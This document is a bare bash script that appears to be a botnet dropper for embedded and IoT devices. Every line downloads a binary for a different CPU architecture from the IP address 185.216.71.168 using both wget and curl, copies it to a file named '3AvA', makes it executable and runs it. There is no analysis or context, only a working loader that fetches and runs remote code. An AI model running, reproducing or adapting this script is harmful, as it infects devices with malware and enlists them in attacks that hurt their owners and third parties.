#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/x86; curl -O http://185.216.71.168/uwu/x86;cat x86 >3AvA;chmod +x *;./3AvA x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/mips; curl -O http://185.216.71.168/uwu/mips;cat mips >3AvA;chmod +x *;./3AvA mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/mpsl; curl -O http://185.216.71.168/uwu/mpsl;cat mpsl >3AvA;chmod +x *;./3AvA mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/arm4; curl -O http://185.216.71.168/uwu/arm4;cat arm4 >3AvA;chmod +x *;./3AvA arm4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/arm5; curl -O http://185.216.71.168/uwu/arm5;cat arm5 >3AvA;chmod +x *;./3AvA arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/arm6; curl -O http://185.216.71.168/uwu/arm6;cat arm6 >3AvA;chmod +x *;./3AvA arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/arm7; curl -O http://185.216.71.168/uwu/arm7;cat arm7 >3AvA;chmod +x *;./3AvA arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/ppc; curl -O http://185.216.71.168/uwu/ppc;cat ppc >3AvA;chmod +x *;./3AvA ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/m68k; curl -O http://185.216.71.168/uwu/m68k;cat m68k >3AvA;chmod +x *;./3AvA m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.216.71.168/uwu/sh4; curl -O http://185.216.71.168/uwu/sh4;cat sh4 >3AvA;chmod +x *;./3AvA sh4
